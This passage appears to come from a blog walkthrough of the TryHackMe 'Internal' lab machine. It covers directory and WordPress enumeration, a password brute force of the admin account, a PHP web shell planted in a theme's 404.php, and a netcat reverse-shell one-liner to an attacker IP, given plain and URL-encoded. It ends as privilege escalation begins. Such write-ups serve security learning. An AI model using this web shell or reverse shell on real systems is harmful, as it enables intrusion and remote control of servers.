Gobuster v3.<span style=color:#ae81ff>1.0</span>                                                                                                                                                                                                    
<span style=color:#66d9ef>by</span> OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)                                                                                                                                                      
===============================================================                                                                                                                                                    
<span style=color:#a6e22e>[+]</span> Url:                     http:<span style=color:#75715e>//10.10.245.7                                                                                                                                                                    
</span><span style=color:#75715e></span><span style=color:#a6e22e>[+]</span> Method:                  GET                                                                                                                                                                                   
<span style=color:#a6e22e>[+]</span> Threads:                 <span style=color:#ae81ff>100</span>                                                                                                                                                                                   [+] Wordlist:                /usr/share/wordlists/dirb/big.txt                                                                                                                                                     [+] Negative Status codes:   <span style=color:#ae81ff>404</span>                                                                                                                                                                                   
<span style=color:#a6e22e>[+]</span> User Agent:              gobuster/<span style=color:#ae81ff>3.1</span>.<span style=color:#ae81ff>0</span>                                                                                                                                                                        
<span style=color:#a6e22e>[+]</span> Expanded:                <span style=color:#66d9ef>true</span>                                                                                                                                                                                  
<span style=color:#a6e22e>[+]</span> Timeout:                 <span style=color:#ae81ff>10</span>s                                                                                                                                                                                   
===============================================================                                                                                                                                                    
<span style=color:#ae81ff>2021</span>/<span style=color:#ae81ff>04</span>/<span style=color:#ae81ff>07</span> <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>05</span>:<span style=color:#ae81ff>27</span> Starting gobuster <span style=color:#66d9ef>in</span> directory enumeration mode                                                                                                                                                
===============================================================                                                                                                                                                    
http:<span style=color:#75715e>//10.10.245.7/.htpasswd            (Status: 403) [Size: 276]                                                                                                                                                  
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.245.7/.htaccess            (Status: 403) [Size: 276]                                                                                                                                                  
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.245.7/blog                 (Status: 301) [Size: 309] [--&gt; http://10.10.245.7/blog/]                                                                                                                   
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.245.7/javascript           (Status: 301) [Size: 315] [--&gt; http://10.10.245.7/javascript/]                                                                                                             
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.245.7/phpmyadmin           (Status: 301) [Size: 315] [--&gt; http://10.10.245.7/phpmyadmin/]                                                                                                             
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.245.7/server-status        (Status: 403) [Size: 276]                                                                                                                                                  
</span><span style=color:#75715e></span>http:<span style=color:#75715e>//10.10.245.7/wordpress            (Status: 301) [Size: 314] [--&gt; http://10.10.245.7/wordpress/]                                                                                                              
</span><span style=color:#75715e></span>                                                                                                                                                                                                                   
===============================================================                                                                                                                                                    
<span style=color:#ae81ff>2021</span>/<span style=color:#ae81ff>04</span>/<span style=color:#ae81ff>07</span> <span style=color:#ae81ff>13</span>:<span style=color:#ae81ff>06</span>:<span style=color:#ae81ff>13</span> Finished                                                                                                                                                                                       
===============================================================                                                                                                                                                    
</code></pre></div><p>&ndash;</p><p>Visiting <code>/blog/</code> we can find that it&rsquo;s hosting wordpress. Let&rsquo;s run wpscan and see what we can enumerate.</p><h4 id=wpscan-blog>WpScan (<code>/blog/</code>)<a hidden class=anchor aria-hidden=true href=#wpscan-blog>#</a></h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span>(root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x)-[/mnt/hgfs/THM/Internal]                                                                  
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> wpscan --url http:<span style=color:#75715e>//internal.thm/blog/ -e u   
</span><span style=color:#75715e></span>_______________________________________________________________                                      
         __          _______   _____                                                                                                                                                                               
         <span style=color:#960050;background-color:#1e0010>\</span> <span style=color:#960050;background-color:#1e0010>\</span>        / /  __ <span style=color:#960050;background-color:#1e0010>\</span> / ____|
          <span style=color:#960050;background-color:#1e0010>\</span> <span style=color:#960050;background-color:#1e0010>\</span>  /<span style=color:#960050;background-color:#1e0010>\</span>  / /| |__) | (___   ___  __ _ _ __ <span style=color:#960050;background-color:#1e0010>Â®</span>
           <span style=color:#960050;background-color:#1e0010>\</span> <span style=color:#960050;background-color:#1e0010>\</span>/  <span style=color:#960050;background-color:#1e0010>\</span>/ / |  ___/ <span style=color:#960050;background-color:#1e0010>\</span>___ <span style=color:#960050;background-color:#1e0010>\</span> / __|/ _<span style=color:#960050;background-color:#1e0010>`</span> | <span style=color:#960050;background-color:#1e0010>&#39;</span>_ \
            <span style=color:#960050;background-color:#1e0010>\</span>  /<span style=color:#960050;background-color:#1e0010>\</span>  /  | |     ____) | (__| (_| | | | |
             <span style=color:#960050;background-color:#1e0010>\</span>/  <span style=color:#960050;background-color:#1e0010>\</span>/   |_|    |_____/ <span style=color:#960050;background-color:#1e0010>\</span>___|<span style=color:#960050;background-color:#1e0010>\</span>__,_|_| |_|

         WordPress Security Scanner <span style=color:#66d9ef>by</span> the WPScan Team
                         Version <span style=color:#ae81ff>3.8</span>.<span style=color:#ae81ff>17</span>
       Sponsored <span style=color:#66d9ef>by</span> Automattic - https:<span style=color:#75715e>//automattic.com/
</span><span style=color:#75715e></span>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> URL: http:<span style=color:#75715e>//internal.thm/blog/ [10.10.25.58]
</span><span style=color:#75715e></span><span style=color:#a6e22e>[+]</span> Started: Wed Apr  <span style=color:#ae81ff>7</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>17</span>:<span style=color:#ae81ff>35</span> <span style=color:#ae81ff>2021</span>

Interesting Finding(s):
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> Headers
 | Interesting Entry: Server: Apache/<span style=color:#ae81ff>2.4</span>.<span style=color:#ae81ff>29</span> (Ubuntu) 
 | Found By: Headers (Passive Detection)
 | Confidence: <span style=color:#ae81ff>100</span>%
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> XML-RPC seems to be enabled: http:<span style=color:#75715e>//internal.thm/blog/xmlrpc.php
</span><span style=color:#75715e></span> | Found By: Direct Access (Aggressive Detection)
 | Confidence: <span style=color:#ae81ff>100</span>%
 | References:
 |  - http:<span style=color:#75715e>//codex.wordpress.org/XML-RPC_Pingback_API
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> WordPress readme found: http:<span style=color:#75715e>//internal.thm/blog/readme.html
</span><span style=color:#75715e></span> | Found By: Direct Access (Aggressive Detection)
 | Confidence: <span style=color:#ae81ff>100</span>%
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> The external WP-Cron seems to be enabled: http:<span style=color:#75715e>//internal.thm/blog/wp-cron.php
</span><span style=color:#75715e></span> | Found By: Direct Access (Aggressive Detection)
 | Confidence: <span style=color:#ae81ff>60</span>%
 | References:
 |  - https:<span style=color:#75715e>//www.iplocation.net/defend-wordpress-from-ddos
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//github.com/wpscanteam/wpscan/issues/1299
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> WordPress version <span style=color:#ae81ff>5.4</span>.<span style=color:#ae81ff>2</span> identified (Insecure, released <span style=color:#66d9ef>on</span> <span style=color:#ae81ff>2020</span>-<span style=color:#ae81ff>06</span>-<span style=color:#ae81ff>10</span>).
 | Found By: Rss Generator (Passive Detection)
 |  - http:<span style=color:#75715e>//internal.thm/blog/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;
</span><span style=color:#75715e></span> |  - http:<span style=color:#75715e>//internal.thm/blog/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> WordPress theme <span style=color:#66d9ef>in</span> use: twentyseventeen
 | Location: http:<span style=color:#75715e>//internal.thm/blog/wp-content/themes/twentyseventeen/
</span><span style=color:#75715e></span> | Last Updated: <span style=color:#ae81ff>2021</span>-<span style=color:#ae81ff>03</span>-<span style=color:#ae81ff>09</span>T00:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00.000</span>Z
 | Readme: http:<span style=color:#75715e>//internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
</span><span style=color:#75715e></span> | [!] The version <span style=color:#66d9ef>is</span> <span style=color:#66d9ef>out</span> of date, the latest version <span style=color:#66d9ef>is</span> <span style=color:#ae81ff>2.6</span>
 | Style URL: http:<span style=color:#75715e>//internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
</span><span style=color:#75715e></span> | Style Name: Twenty Seventeen
 | Style URI: https:<span style=color:#75715e>//wordpress.org/themes/twentyseventeen/
</span><span style=color:#75715e></span> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https:<span style=color:#75715e>//wordpress.org/
</span><span style=color:#75715e></span> |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: <span style=color:#ae81ff>2.3</span> (<span style=color:#ae81ff>80</span>% confidence)
 | Found By: Style (Passive Detection)
 |  - http:<span style=color:#75715e>//internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: &#39;Version: 2.3&#39;
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span> &lt;=====================================================================================================================================&gt; (<span style=color:#ae81ff>10</span> / <span style=color:#ae81ff>10</span>) <span style=color:#ae81ff>100.00</span>% Time: <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[i]</span> User(s) Identified:
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http:<span style=color:#75715e>//internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
</span><span style=color:#75715e></span> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[!]</span> No WPScan API Token given, <span style=color:#66d9ef>as</span> a result vulnerability data has not been output.
<span style=color:#a6e22e>[!]</span> You can <span style=color:#66d9ef>get</span> a free API token with <span style=color:#ae81ff>25</span> daily requests <span style=color:#66d9ef>by</span> registering at https:<span style=color:#75715e>//wpscan.com/register
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> Finished: Wed Apr  <span style=color:#ae81ff>7</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>17</span>:<span style=color:#ae81ff>39</span> <span style=color:#ae81ff>2021</span>
<span style=color:#a6e22e>[+]</span> Requests Done: <span style=color:#ae81ff>13</span>
<span style=color:#a6e22e>[+]</span> Cached Requests: <span style=color:#ae81ff>48</span>
<span style=color:#a6e22e>[+]</span> Data Sent: <span style=color:#ae81ff>3.457</span> KB
<span style=color:#a6e22e>[+]</span> Data Received: <span style=color:#ae81ff>9.149</span> KB
<span style=color:#a6e22e>[+]</span> Memory used: <span style=color:#ae81ff>167</span> MB
<span style=color:#a6e22e>[+]</span> Elapsed time: <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>03</span>
</code></pre></div><p>We can see that <code>admin</code> user exists in the application. Let&rsquo;s use <code>rockyou.txt</code> wordlist for bruteforcing.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span>(root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x)-[/mnt/hgfs/THM/Internal]                                                                                                                                                                   [<span style=color:#ae81ff>475</span>/<span style=color:#ae81ff>528</span>]
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> wpscan --url http:<span style=color:#75715e>//internal.thm/blog/ -v -e u -P /usr/share/wordlists/rockyou.txt -t 500                                                                                                                  2 â¨¯
</span><span style=color:#75715e></span>_______________________________________________________________                                          
         __          _______   _____                                                                                                                                                                               
         <span style=color:#960050;background-color:#1e0010>\</span> <span style=color:#960050;background-color:#1e0010>\</span>        / /  __ <span style=color:#960050;background-color:#1e0010>\</span> / ____|                                                                                                                                                                              
          <span style=color:#960050;background-color:#1e0010>\</span> <span style=color:#960050;background-color:#1e0010>\</span>  /<span style=color:#960050;background-color:#1e0010>\</span>  / /| |__) | (___   ___  __ _ _ __ <span style=color:#960050;background-color:#1e0010>Â®</span>                                                   
           <span style=color:#960050;background-color:#1e0010>\</span> <span style=color:#960050;background-color:#1e0010>\</span>/  <span style=color:#960050;background-color:#1e0010>\</span>/ / |  ___/ <span style=color:#960050;background-color:#1e0010>\</span>___ <span style=color:#960050;background-color:#1e0010>\</span> / __|/ _<span style=color:#960050;background-color:#1e0010>`</span> | <span style=color:#960050;background-color:#1e0010>&#39;</span>_ <span style=color:#960050;background-color:#1e0010>\</span>                                                    
            <span style=color:#960050;background-color:#1e0010>\</span>  /<span style=color:#960050;background-color:#1e0010>\</span>  /  | |     ____) | (__| (_| | | | |
             <span style=color:#960050;background-color:#1e0010>\</span>/  <span style=color:#960050;background-color:#1e0010>\</span>/   |_|    |_____/ <span style=color:#960050;background-color:#1e0010>\</span>___|<span style=color:#960050;background-color:#1e0010>\</span>__,_|_| |_|

         WordPress Security Scanner <span style=color:#66d9ef>by</span> the WPScan Team
                         Version <span style=color:#ae81ff>3.8</span>.<span style=color:#ae81ff>17</span>
       Sponsored <span style=color:#66d9ef>by</span> Automattic - https:<span style=color:#75715e>//automattic.com/
</span><span style=color:#75715e></span>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> URL: http:<span style=color:#75715e>//internal.thm/blog/ [10.10.25.58]
</span><span style=color:#75715e></span><span style=color:#a6e22e>[+]</span> Started: Wed Apr  <span style=color:#ae81ff>7</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>25</span> <span style=color:#ae81ff>2021</span>

Interesting Finding(s):
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> Headers
 | Interesting Entry: Server: Apache/<span style=color:#ae81ff>2.4</span>.<span style=color:#ae81ff>29</span> (Ubuntu) 
 | Found By: Headers (Passive Detection)
 | Confidence: <span style=color:#ae81ff>100</span>%
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> XML-RPC seems to be enabled: http:<span style=color:#75715e>//internal.thm/blog/xmlrpc.php
</span><span style=color:#75715e></span> | Found By: Direct Access (Aggressive Detection)
 | Confidence: <span style=color:#ae81ff>100</span>%
 | References:
 |  - http:<span style=color:#75715e>//codex.wordpress.org/XML-RPC_Pingback_API
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> WordPress readme found: http:<span style=color:#75715e>//internal.thm/blog/readme.html
</span><span style=color:#75715e></span> | Found By: Direct Access (Aggressive Detection)
 | Confidence: <span style=color:#ae81ff>100</span>%
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> The external WP-Cron seems to be enabled: http:<span style=color:#75715e>//internal.thm/blog/wp-cron.php
</span><span style=color:#75715e></span> | Found By: Direct Access (Aggressive Detection)
 | Confidence: <span style=color:#ae81ff>60</span>%
 | References:
 |  - https:<span style=color:#75715e>//www.iplocation.net/defend-wordpress-from-ddos
</span><span style=color:#75715e></span> |  - https:<span style=color:#75715e>//github.com/wpscanteam/wpscan/issues/1299
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> WordPress version <span style=color:#ae81ff>5.4</span>.<span style=color:#ae81ff>2</span> identified (Insecure, released <span style=color:#66d9ef>on</span> <span style=color:#ae81ff>2020</span>-<span style=color:#ae81ff>06</span>-<span style=color:#ae81ff>10</span>).
 | Found By: Rss Generator (Passive Detection)
 |  - http:<span style=color:#75715e>//internal.thm/blog/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;                                                                                                     [426/528]
</span><span style=color:#75715e></span> |  - http:<span style=color:#75715e>//internal.thm/blog/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> WordPress theme <span style=color:#66d9ef>in</span> use: twentyseventeen
 | Location: http:<span style=color:#75715e>//internal.thm/blog/wp-content/themes/twentyseventeen/
</span><span style=color:#75715e></span> | Last Updated: <span style=color:#ae81ff>2021</span>-<span style=color:#ae81ff>03</span>-<span style=color:#ae81ff>09</span>T00:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00.000</span>Z
 | Readme: http:<span style=color:#75715e>//internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
</span><span style=color:#75715e></span> | [!] The version <span style=color:#66d9ef>is</span> <span style=color:#66d9ef>out</span> of date, the latest version <span style=color:#66d9ef>is</span> <span style=color:#ae81ff>2.6</span>
 | Style URL: http:<span style=color:#75715e>//internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
</span><span style=color:#75715e></span> | Style Name: Twenty Seventeen
 | Style URI: https:<span style=color:#75715e>//wordpress.org/themes/twentyseventeen/
</span><span style=color:#75715e></span> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a focus <span style=color:#66d9ef>on</span> business sites, it features multiple sections <span style=color:#66d9ef>on</span> the front page <span style=color:#66d9ef>as</span> well <span style=color:#66d9ef>as</span> widgets, navi
gation and social menus, a logo, and more. Personalize its asymmetrical grid with a custom color scheme and showcase your multimedia content with post formats. Our <span style=color:#66d9ef>default</span> theme <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>2017</span> works great <span style=color:#66d9ef>in</span> many lang
uages, <span style=color:#66d9ef>for</span> any abilities, and <span style=color:#66d9ef>on</span> any device.
 | Author: the WordPress team
 | Author URI: https:<span style=color:#75715e>//wordpress.org/
</span><span style=color:#75715e></span> | License: GNU General Public License v2 or later
 | License URI: http:<span style=color:#75715e>//www.gnu.org/licenses/gpl-2.0.html
</span><span style=color:#75715e></span> | Tags: one-column, two-columns, right-sidebar, flexible-header, accessibility-ready, custom-colors, custom-header, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, post-formats, rtl-lan
guage-support, sticky-post, theme-options, threaded-comments, translation-ready
 | Text Domain: twentyseventeen
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: <span style=color:#ae81ff>2.3</span> (<span style=color:#ae81ff>80</span>% confidence)
 | Found By: Style (Passive Detection)
 |  - http:<span style=color:#75715e>//internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: &#39;Version: 2.3&#39;
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>04</span> &lt;=====================================================================================================================================&gt; (<span style=color:#ae81ff>10</span> / <span style=color:#ae81ff>10</span>) <span style=color:#ae81ff>100.00</span>% Time: <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>04</span>
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[i]</span> User(s) Identified:
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http:<span style=color:#75715e>//internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
</span><span style=color:#75715e></span> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
<span style=color:#a6e22e>
</span><span style=color:#a6e22e>[+]</span> Performing password attack <span style=color:#66d9ef>on</span> Xmlrpc against <span style=color:#ae81ff>1</span> user/s
<span style=color:#a6e22e>[SUCCESS]</span> - admin / ...                                                                              
Trying admin / timmy1 Time: <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>01</span>:<span style=color:#ae81ff>35</span> &lt;                                                                                                                                    &gt; (<span style=color:#ae81ff>4000</span> / <span style=color:#ae81ff>14348392</span>)  <span style=color:#ae81ff>0.02</span>%  ETA: ??:??:??
<span style=color:#a6e22e>                                                                                                         
</span><span style=color:#a6e22e>[!]</span> Valid Combinations Found:                                                                            
 | Username: admin, Password: ...                                                                    
<span style=color:#a6e22e>                                                                                                         
</span><span style=color:#a6e22e>[!]</span> No WPScan API Token given, <span style=color:#66d9ef>as</span> a result vulnerability data has not been output.                       
<span style=color:#a6e22e>[!]</span> You can <span style=color:#66d9ef>get</span> a free API token with <span style=color:#ae81ff>25</span> daily requests <span style=color:#66d9ef>by</span> registering at https:<span style=color:#75715e>//wpscan.com/register    
</span><span style=color:#75715e></span><span style=color:#a6e22e>                                                                                                         
</span><span style=color:#a6e22e>[+]</span> Finished: Wed Apr  <span style=color:#ae81ff>7</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>11</span>:<span style=color:#ae81ff>21</span> <span style=color:#ae81ff>2021</span>                                                                   
<span style=color:#a6e22e>[+]</span> Requests Done: <span style=color:#ae81ff>4056</span>                                                                                  
<span style=color:#a6e22e>[+]</span> Cached Requests: <span style=color:#ae81ff>7</span>                                                                                   
<span style=color:#a6e22e>[+]</span> Data Sent: <span style=color:#ae81ff>2.022</span> MB                                                                                  
<span style=color:#a6e22e>[+]</span> Data Received: <span style=color:#ae81ff>2.759</span> MB                                                                              
<span style=color:#a6e22e>[+]</span> Memory used: <span style=color:#ae81ff>186.539</span> MB                                                                              
<span style=color:#a6e22e>[+]</span> Elapsed time: <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>01</span>:<span style=color:#ae81ff>55</span>                                                                               
</code></pre></div><p>Got hit around <code>4000</code> tries, we get credentials of the user <code>admin</code></p><p><code>admin:...</code></p><hr><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Let&rsquo;s now try and login and get reverse shell on our machine. I&rsquo;ll be editing the theme file (404.php) and add the following for rce:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
	
<span style=color:#a6e22e>system</span>($_GET[<span style=color:#ae81ff>123</span>]);

<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>Added the snippet for getting RCE</p><p><img loading=lazy src=/images/internal-thm/Pasted%20image%2020210407142240.png alt></p><p>Now, we need to visit a 404 page on the application to get RCE! We do so by finding a legit blog post and just changing the URL.</p><h3 id=rce>RCE<a hidden class=anchor aria-hidden=true href=#rce>#</a></h3><p><img loading=lazy src=/images/internal-thm/Pasted%20image%2020210407142220.png alt></p><h3 id=reverse-shell-time>Reverse Shell time!<a hidden class=anchor aria-hidden=true href=#reverse-shell-time>#</a></h3><p>Alright, time to get reverse shell, let&rsquo;s see if we&rsquo;ve <code>nc</code> on the host. Can do so by using <code>which</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>which nc
</code></pre></div><p><img loading=lazy src=/images/internal-thm/Pasted%20image%2020210407142400.png alt></p><p>Alright, <code>nc</code> exists. We can utilize the following to get reverse shell:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i <span style=color:#ae81ff>2</span>&gt;&amp;<span style=color:#ae81ff>1</span>|nc <span style=color:#ae81ff>10.17</span>.<span style=color:#ae81ff>0.120</span> <span style=color:#ae81ff>4444</span> &gt;/tmp/f
</code></pre></div><p>Let&rsquo;s URL encode it before using, since due to <code>&</code> the payload might not execute. We can use cyberchef for doing so.</p><p><img loading=lazy src=/images/internal-thm/Pasted%20image%2020210407142522.png alt></p><p>Remember to encode all special characters as well!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>rm%<span style=color:#ae81ff>20</span>%<span style=color:#ae81ff>2F</span>tmp%<span style=color:#ae81ff>2F</span>f%<span style=color:#ae81ff>3</span>Bmkfifo%<span style=color:#ae81ff>20</span>%<span style=color:#ae81ff>2F</span>tmp%<span style=color:#ae81ff>2F</span>f%<span style=color:#ae81ff>3</span>Bcat%<span style=color:#ae81ff>20</span>%<span style=color:#ae81ff>2F</span>tmp%<span style=color:#ae81ff>2F</span>f%<span style=color:#ae81ff>7</span>C%<span style=color:#ae81ff>2F</span>bin%<span style=color:#ae81ff>2F</span>bash%<span style=color:#ae81ff>20</span>%<span style=color:#ae81ff>2D</span>i%<span style=color:#ae81ff>202</span>%<span style=color:#ae81ff>3</span>E%<span style=color:#ae81ff>261</span>%<span style=color:#ae81ff>7</span>Cnc%<span style=color:#ae81ff>2010</span>%<span style=color:#ae81ff>2</span>E17%<span style=color:#ae81ff>2</span>E0%<span style=color:#ae81ff>2</span>E120%<span style=color:#ae81ff>204444</span>%<span style=color:#ae81ff>20</span>%<span style=color:#ae81ff>3</span>E%<span style=color:#ae81ff>2F</span>tmp%<span style=color:#ae81ff>2F</span>f
</code></pre></div><p>Let&rsquo;s get RCE now, first start listener on local <code>4444</code> port.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>http:<span style=color:#75715e>//internal.thm/blog/index.php/2020/08/04/hello-world/?123=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%2010%2E17%2E0%2E120%204444%20%3E%2Ftmp%2Ff
</span></code></pre></div><p>Got reverse shell! Beautified and made it interactive as well.</p><p><img loading=lazy src=/images/internal-thm/Pasted%20image%2020210407142759.png alt></p><hr><h2 id=privileges-escalation>Privileges Escalation<a hidden class=anchor aria-hidden=true href=#privileges-escalation>#</a></h2><p>Alright, we got shell as <code>www-data</code> user and can&rsquo;t really find any flags. Also, there&rsquo;s a user in <code>/home/aubreanna</code></p><p>Looking at the processes we can see that it has one <strong>java</strong> service running:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>www-data@internal:/<span style=color:#66d9ef>var</span>/www/html/wordpress<span style=color:#960050;background-color:#1e0010>$</span> ps aux | grep aubrean
aubrean+  <span style=color:#ae81ff>1540</span>  <span style=color:#ae81ff>0.0</span>  <span style=color:#ae81ff>0.0</span>   <span style=color:#ae81ff>1148</span>     <span style=color:#ae81ff>4</span> ?        Ss   <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>07</span>   <span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>00</span> /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  <span style=color:#ae81ff>1574</span>  <span style=color:#ae81ff>1.7</span> <span style=color:#ae81ff>12.0</span> <span style=color:#ae81ff>2587808</span> <span style=color:#ae81ff>245668</span> ?      Sl   <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>07</span>   <span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>23</span> java -Duser.home=/<span style=color:#66d9ef>var</span>/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=<span style=color:#ae81ff>50000</span> -jar /usr/share/jenkins/jenkins.war
